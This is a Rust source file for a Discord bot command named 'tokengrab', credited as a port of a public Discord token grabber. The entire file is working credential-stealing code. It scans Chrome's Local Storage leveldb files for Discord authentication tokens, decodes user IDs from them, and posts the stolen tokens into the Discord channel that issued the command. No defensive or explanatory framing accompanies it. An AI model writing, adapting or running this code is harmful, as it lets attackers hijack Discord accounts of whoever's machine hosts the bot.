// Credit: https://github.com/piotr-ginal/discord-token-grabber/blob/main/grabbers/token_grabber.py

use crate::commands::*;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use twilight_util::builder::embed::EmbedBuilder;
use twilight_model::channel::message::embed::EmbedField;
use async_trait::async_trait;
use anyhow::Result;
use std::env;
use std::path::Path;
use std::fs;
use regex::Regex;
use base64::{Engine as _, engine::general_purpose};

pub struct TokenGrabberCommand;

#[async_trait]
impl BotCommand for TokenGrabberCommand {
    fn name(&self) -> &str { "tokengrab" }
    fn description(&self) -> &str { "Grab Discord tokens from Chrome Local Storage" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".tokengrab" }
    fn examples(&self) -> &'static [&'static str] { &[".tokengrab"] }
    fn aliases(&self) -> &'static [&'static str] { &["grabtoken", "token"] }


    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        http.create_message(msg.channel_id)
            .content("Searching for Discord tokens in Chrome Local Storage...")
            .await?;

        match find_discord_tokens().await {
            Ok(tokens) => {
                if tokens.is_empty() {
                    let embed = EmbedBuilder::new()
                        .description("**No Discord tokens found**\n\nNo valid Discord tokens were found in Chrome's Local Storage.")
                        .color(0xff0000)
                        .build();

                    http.create_message(msg.channel_id)
                        .embeds(&[embed])
                        .await?;
                } else {
                    let mut fields = Vec::new();

                    for (user_id, token_set) in tokens {
                        let tokens_list: Vec<String> = token_set.into_iter().collect();
                        let tokens_text = tokens_list.join("\n");

                        // Truncate if too long
                        let tokens_display = if tokens_text.len() > 1000 {
                            format!("{}\n...({} more tokens)",
                                tokens_text.chars().take(1000).collect::<String>(),
                                tokens_list.len().saturating_sub(1)
                            )
                        } else {
                            tokens_text
                        };

                        fields.push(EmbedField {
                            name: format!("User ID: {}", user_id),
                            value: format!("```\n{}\n```", tokens_display),
                            inline: false,
                        });
                    }

                    let mut embed = EmbedBuilder::new()
                        .description(format!("**Found {} Discord token(s)**", fields.len()))
                        .color(0x00ff00);

                    for field in fields {
                        embed = embed.field(field);
                    }

                    let embed = embed.build();

                    http.create_message(msg.channel_id)
                        .embeds(&[embed])
                        .await?;
                }
            }
            Err(e) => {
                let embed = EmbedBuilder::new()
                    .description(format!("**Error searching for tokens**\n\n```\n{}\n```", e))
                    .color(0xff0000)
                    .build();

                http.create_message(msg.channel_id)
                    .embeds(&[embed])
                    .await?;
            }
        }

        Ok(())
    }
}

async fn find_discord_tokens() -> Result<std::collections::HashMap<String, std::collections::HashSet<String>>> {
    let local_app_data = env::var("LOCALAPPDATA")
        .map_err(|_| anyhow::anyhow!("LOCALAPPDATA environment variable not found"))?;

    let chrome_path = Path::new(&local_app_data)
        .join("Google")
        .join("Chrome")
        .join("User Data")
        .join("Default")
        .join("Local Storage")
        .join("leveldb");

    if !chrome_path.exists() {
        return Ok(std::collections::HashMap::new());
    }

    let token_regex = Regex::new(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}")?;
    let mut id_to_tokens = std::collections::HashMap::new();

    let entries = match fs::read_dir(&chrome_path) {
        Ok(entries) => entries,
        Err(e) => {
            if e.kind() == std::io::ErrorKind::PermissionDenied {
                return Err(anyhow::anyhow!("Permission denied accessing Chrome Local Storage"));
            }
            return Err(e.into());
        }
    };

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        if path.is_file() {
            if let Ok(contents) = fs::read_to_string(&path) {
                for token_match in token_regex.find_iter(&contents) {
                    let token = token_match.as_str();

                    if let Some(user_id) = extract_user_id_from_token(token) {
                        id_to_tokens
                            .entry(user_id)
                            .or_insert_with(std::collections::HashSet::new)
                            .insert(token.to_string());
                    }
                }
            }
        }
    }

    Ok(id_to_tokens)
}

fn extract_user_id_from_token(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 1 {
        return None;
    }

    let encoded_id = parts[0];

    // Add padding if needed
    let padding_needed = (4 - (encoded_id.len() % 4)) % 4;
    let mut padded_id = encoded_id.to_string();
    for _ in 0..padding_needed {
        padded_id.push('=');
    }

    match general_purpose::STANDARD.decode(&padded_id) {
        Ok(decoded) => match String::from_utf8(decoded) {
            Ok(user_id) => Some(user_id),
            Err(_) => None,
        },
        Err(_) => None,
    }
}